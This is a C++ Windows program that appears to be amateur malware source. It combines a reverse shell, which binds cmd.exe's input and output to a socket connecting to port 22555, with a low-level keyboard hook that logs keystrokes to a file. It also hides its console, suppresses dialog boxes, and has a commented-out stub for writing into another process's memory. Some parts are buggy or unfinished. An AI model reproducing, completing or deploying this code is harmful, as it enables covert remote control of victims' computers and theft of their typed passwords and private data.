#include<iostream>
#include<WinSock2.h>
#include <Psapi.h>
#include<Windows.h>
#include<processthreadsapi.h>
#include <ws2tcpip.h>
#include<fstream>
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

    SOCKET soket = WSASocketW(2, 1, 6, NULL, NULL, NULL);
    sockaddr_in server;
    void strem() {
        const char add[10] = "127.0.0.1";
        const char cmd[6] = "hello";
        PCWSTR bc = PCWSTR(add);
        InetPton(AF_INET, bc, &server.sin_addr.s_addr);
        server.sin_port = unsigned short(22555);
        server.sin_family = AF_INET;
    }
    SOCKET get_soket() {
        return soket;
    }
    sockaddr_in get_add() {
        return server;
    }
    

    int create() {
        WSADATA strtup;
        char data[512];
        if (WSAStartup(MAKEWORD(2, 2), &strtup) != 0) {
            return -1;
        }

        // Set up startup info and process info structures
        STARTUPINFOA si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; // Use wShowWindow field
        si.wShowWindow = SW_SHOWNORMAL;    // Show the window normally

        // Create the child process
        const char* a = "cmd.exe ";
        LPCSTR appName = LPCSTR("notepad.exe");
        LPSTR app = (LPSTR)a;

        
        //SOCKET soket = get_soket();
        //sockaddr_in server = get_add();

        if (connect(soket, (const sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            printf("Connection failed.\n");
            closesocket(soket);
            WSACleanup();
            return 1;
        }
        else
        {
            recv(soket, data, sizeof(data), 0);
            si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)soket;
            BOOL createResult = CreateProcessA(
                NULL,                  // lpCommandLine
                app,
                NULL,                 // lpProcessAttributes
                NULL,                 // lpThreadAttributes
                TRUE,                 // bInheritHandles
                CREATE_NEW_PROCESS_GROUP,                    // dwCreationFlags
                NULL,                 // lpEnvironment
                NULL,                 // lpCurrentDirectory
                &si,                  // lpStartupInfo
                &pi                   // lpProcessInformation
            );
            if (createResult) {
                std::cout << "sucess" << std::endl;
                printf("Parent PID: %d\n", GetCurrentProcessId());
                printf("Child PID: %d\n", GetProcessId(pi.hProcess));
            }
            else {
                std::cout << "Handle error" << std::endl;
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        char b;
        std::cin >> b;
    }

// Global hook handle 

HHOOK g_hookHandle;
std::ofstream outputFile("example.txt");
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKeyboardHookStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            DWORD vkCode = pKeyboardHookStruct->vkCode;
            if (outputFile.is_open()) {
                outputFile << vkCode << std::endl; // Write to file
            }
            else {
                std::cout << "Unable to open file for writing." << std::endl;
                return 1;
            }
        }
    }
    return CallNextHookEx(g_hookHandle, nCode, wParam, lParam);
}

LRESULT CALLBACK CallWndProcHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        CWPSTRUCT* pCwpStruct = (CWPSTRUCT*)lParam;

        // Check if a message box is about to be created (WM_INITDIALOG message)
        if (pCwpStruct->message == WM_INITDIALOG)
        {
            // Suppress the message box by returning TRUE
            return TRUE;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    create();
    g_hookHandle = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);

    if (g_hookHandle == NULL)
    {
        std::cout << "Failed to set the keyboard hook!" << std::endl;
        return 1;
    }

    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole(); // Detach from the console

    // Hook the CallWndProc function to suppress message boxes
    HHOOK callWndProcHook = SetWindowsHookExA(WH_CALLWNDPROC, CallWndProcHook, NULL, GetCurrentThreadId());

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole(); // Detach from the console 
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the CallWndProc hook
    UnhookWindowsHookEx(callWndProcHook);

    // Unhook the keyboard hook (you should handle unhooking properly when your program exits)
    UnhookWindowsHookEx(g_hookHandle);

    return 0;
}


/*int main(int argc, char* argv[]) {
    HANDLE process;
    LPVOID rbuffer;
     process = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, DWORD(argv[1]));
    char a[512];
    rbuffer = VirtualAlloc2(process,NULL, sizeof(a), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,NULL,NULL);
    WriteProcessMemory(process,rbuffer)
}*/
